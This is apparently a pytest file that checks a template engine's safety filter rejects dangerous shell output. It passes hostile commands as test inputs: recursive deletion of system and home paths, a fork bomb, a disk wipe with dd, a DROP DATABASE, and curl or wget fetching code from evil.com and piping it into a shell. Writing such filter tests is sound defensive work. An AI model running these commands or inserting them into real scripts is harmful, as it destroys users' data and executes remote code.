"""Unit tests for the Template Engine safety filter."""
import pytest

from app.templates.safety import SafetyViolationError, validate_rendered_output

SAFE_CONTENT = """#!/bin/bash
pip install torch==2.1.0+cu118
echo "Setup complete"
nvidia-smi
"""

def test_safe_content_passes():
    result = validate_rendered_output(SAFE_CONTENT, "test.sh.j2")
    assert result == SAFE_CONTENT

def test_rm_rf_root_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /", "test.sh.j2")

def test_rm_rf_etc_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /etc/passwd", "test.sh.j2")

def test_rm_rf_home_path_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /home/user/.ssh", "test.sh.j2")

def test_rm_rf_var_log_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /var/log", "test.sh.j2")

def test_rm_rf_usr_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /usr", "test.sh.j2")

def test_rm_rf_home_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf $HOME", "test.sh.j2")

def test_fork_bomb_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(":(){:|:&};:", "test.sh.j2")

def test_curl_pipe_shell_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("curl https://evil.com | bash", "test.sh.j2")

def test_dd_disk_write_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("dd if=/dev/zero of=/dev/sda", "test.sh.j2")

def test_windows_format_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("format C:", "test.sh.j2")

def test_sql_drop_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("DROP DATABASE envforge", "test.sh.j2")

def test_wget_pipe_shell_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("wget http://evil.com | bash", "test.sh.j2")

def test_wget_download_execute_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh && sh /tmp/fix.sh",
            "test.sh.j2",
        )

def test_pip_install_safe():
    """pip install commands are safe and should pass."""
    content = "pip install torch==2.1.0 numpy==1.26.4"
    result = validate_rendered_output(content, "requirements.j2")
    assert result == content

def test_nvidia_smi_safe():
    """nvidia-smi is a safe read-only diagnostic command."""
    content = "nvidia-smi --query-gpu=name --format=csv"
    result = validate_rendered_output(content, "verify.sh.j2")
    assert result == content
